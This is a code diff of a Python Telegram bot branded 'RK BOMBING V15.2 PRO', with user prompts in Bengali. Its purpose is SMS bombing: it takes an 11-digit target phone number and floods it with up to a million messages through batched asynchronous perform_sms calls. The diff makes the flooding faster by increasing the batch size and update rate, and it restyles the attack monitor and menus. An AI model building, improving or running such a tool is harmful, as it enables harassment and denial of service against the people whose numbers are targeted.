@@ -118,31 +118,31 @@ async def attack_orchestrator(chat_id, message_id, target, limit):
             if active_attacks.get(chat_id, {}).get('stop'): break
             if not evt.is_set(): await evt.wait()
             
-            batch_size = 25 # High speed batch
+            # High speed batching
+            batch_size = 30 
             batch = min(batch_size, limit - stats['total'])
             tasks = [perform_sms(session, target, stats) for _ in range(batch)]
             await asyncio.gather(*tasks)
             
             try:
-                # Calculations
                 prog = int((stats['total']/limit)*100)
                 bar_count = prog // 10
                 bar = "🔹" * bar_count + "▫️" * (10 - bar_count)
                 current_time = datetime.now(TZ)
                 elapsed = int((current_time - start_time).total_seconds())
                 
-                # Stylish Monitor
+                # MONITOR STYLE (EXACTLY AS REQUESTED)
                 monitor_txt = (
                     f"━━━━━━━━━━━━━━━━━━━━\n"
-                    f"📱 **Target:** `{target}`\n"
-                    f"📊 **Progress:** `{prog}%` {bar}\n"
-                    f"✅ **Success:** `{stats['ok']}`\n"
-                    f"❌ **Fail:** `{stats['err']}`\n"
-                    f"🔢 **Total Sent:** `{stats['total']}/{limit}`\n"
+                    f"📱 Target: `{target}`\n"
+                    f"📊 Progress: `{prog}%` {bar}\n"
+                    f"✅ Success: `{stats['ok']}` ]\n"
+                    f"❌ Fail: `{stats['err']}` ]\n"
+                    f"🔢 Total Sent: `{stats['total']}/{limit}` ]\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n"
-                    f"🕒 **Started:** `{start_time.strftime('%I:%M:%S %p | %d-%m-%Y')}`\n"
-                    f"⏳ **Running Time:** `{elapsed}s`\n"
-                    f"📡 **STATUS:** `{active_attacks[chat_id]['status'].upper()}`\n"
+                    f"🕒 Started: `{start_time.strftime('%I:%M:%S %p | %d-%m-%Y')}` ]\n"
+                    f"⏳ Running_Time: `{elapsed}s` ]\n"
+                    f"📡 STATUS: `{active_attacks[chat_id]['status'].upper()}` ]\n"
                     f"━━━━━━━━━━━━━━━━━━━━"
                 )
                 
@@ -150,28 +150,28 @@ async def attack_orchestrator(chat_id, message_id, target, limit):
                                           reply_markup=get_control_panel(chat_id, active_attacks[chat_id]['status']),
                                           parse_mode="Markdown")
             except: pass
-            await asyncio.sleep(1)
+            await asyncio.sleep(0.8) # Faster updates
 
     active_attacks[chat_id]['status'] = 'completed'
     attack_history.append({"target": target, "count": stats['ok'], "time": datetime.now(TZ).strftime('%d-%m %I:%M %p')})
     save_data()
     
-    final_msg = f"🏁 **ATTACK FINISHED** 🏁\n━━━━━━━━━━━━━━\n📱 Target: `{target}`\n✅ Successfully Sent: `{stats['ok']}`\n🚀 Bot: RK V15.2 PRO"
+    final_msg = f"🏁 **ATTACK FINISHED** 🏁\n━━━━━━━━━━━━━━\n📱 Target: `{target}`\n✅ Successfully Sent: `{stats['ok']}`"
     await bot.send_message(chat_id, final_msg, reply_markup=get_main_menu())
     active_attacks.pop(chat_id, None)
 
 # --- HANDLERS ---
 @bot.message_handler(commands=['start'])
 async def start(m):
-    welcome = (f"🔥 **WELCOME TO RK BOMBING V15.2** 🔥\n\n"
-               f"বটটি এখন আগের চেয়ে অনেক দ্রুত এবং স্টাইলিশ।\n"
-               f"নিচের মেনু ব্যবহার করে অ্যাটাক শুরু করুন।")
+    welcome = (f"🔥 **RK BOMBING V15.2 PRO** 🔥\n\n"
+               f"বট এখন সুপার ফাস্ট! ১,০০০,০০০ লিমিট আনলক করা হয়েছে।\n"
+               f"নিচের বাটন চেপে শুরু করুন।")
     await bot.send_message(m.chat.id, welcome, reply_markup=get_main_menu(), parse_mode="Markdown")
 
 @bot.message_handler(func=lambda m: m.text == "🚀 Start Attack")
 async def ask_num(m):
     if m.chat.id not in authorized_users: 
-        return await bot.reply_to(m, "🚫 **Access Denied!**\nআপনার কাছে এই বট ব্যবহারের অনুমতি নেই।")
+        return await bot.reply_to(m, "🚫 **Access Denied!**")
     user_states[m.chat.id] = {"step": "num"}
     await bot.send_message(m.chat.id, "📞 **টার্গেট নম্বর দিন (১১ ডিজিট):**", reply_markup=types.ReplyKeyboardRemove())
 
@@ -179,35 +179,35 @@ async def ask_num(m):
 async def get_num(m):
     if len(m.text) == 11 and m.text.isdigit():
         user_states[m.chat.id] = {"step": "limit", "target": m.text}
-        await bot.send_message(m.chat.id, "🔢 **আক্রমণের পরিমাণ দিন (Max 1,000,000):**")
+        await bot.send_message(m.chat.id, "🔢 **আক্রমণের পরিমাণ দিন (সর্বোচ্চ ১,০০০,০০০):**")
     else:
-        await bot.reply_to(m, "❌ **ভুল নম্বর!** সঠিক নম্বর দিন।")
+        await bot.reply_to(m, "❌ ভুল নম্বর!")
 
 @bot.message_handler(func=lambda m: m.chat.id in user_states and user_states[m.chat.id].get("step") == "limit")
 async def get_lim(m):
     try:
         limit = int(m.text)
-        if limit > 1000000: limit = 1000000
+        if limit > 1000000: limit = 1000000 # Limit set to 1 million
+        
         target = user_states[m.chat.id]['target']
         user_states.pop(m.chat.id)
         
-        msg = await bot.send_message(m.chat.id, "⚡ **ইঞ্জিন প্রস্তুত হচ্ছে...**")
+        msg = await bot.send_message(m.chat.id, "⚡ **ইঞ্জিন লোড হচ্ছে...**")
         asyncio.create_task(attack_orchestrator(m.chat.id, msg.message_id, target, limit))
     except:
-        await bot.reply_to(m, "⚠️ **শুধুমাত্র সংখ্যা লিখুন!**")
+        await bot.reply_to(m, "⚠️ শুধুমাত্র সংখ্যা দিন!")
 
 @bot.message_handler(func=lambda m: m.text == "📊 System Info")
 async def sys_info(m):
     cpu = psutil.cpu_percent()
     ram = psutil.virtual_memory().percent
     txt = (f"🖥 **SYSTEM ANALYTICS**\n━━━━━━━━━━━━━━\n"
-           f"⚡ **CPU Usage:** `{cpu}%` \n"
-           f"🧠 **RAM Usage:** `{ram}%` \n"
-           f"📨 **Total SMS Sent:** `{global_sms_count}`\n"
-           f"⏳ **Active Threads:** `{len(active_attacks)}` \n"
-           f"🚀 **Bot Status:** `OPTIMIZED` \n"
+           f"⚡ CPU: `{cpu}%` | 🧠 RAM: `{ram}%` \n"
+           f"📨 Total Sent: `{global_sms_count}`\n"
+           f"⏳ Active Threads: `{len(active_attacks)}` \n"
+           f"🚀 Bot Version: `V15.2 PRO` \n"
            f"━━━━━━━━━━━━━━")
-    await bot.reply_to(m, txt, parse_mode="Markdown")
+    await bot.reply_to(m, txt)
 
 @bot.callback_query_handler(func=lambda c: True)
 async def cb(c):
@@ -226,12 +226,12 @@ async def cb(c):
         if cid in active_attacks:
             active_attacks[cid]['stop'] = True
             active_attacks[cid]['event'].set()
-            await bot.answer_callback_query(c.id, "Attack Stopped ⏹")
+            await bot.answer_callback_query(c.id, "Stopped ⏹")
 
-# --- MAIN RUNNER ---
+# --- RUNNER ---
 async def main():
     load_all_data()
-    print("Bot is starting...")
+    print("RK V15.2 PRO is online!")
     await asyncio.gather(
         start_health_server(),
         keep_alive(),
@@ -239,7 +239,4 @@ async def main():
     )
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except (KeyboardInterrupt, SystemExit):
-        pass
+    asyncio.run(main())
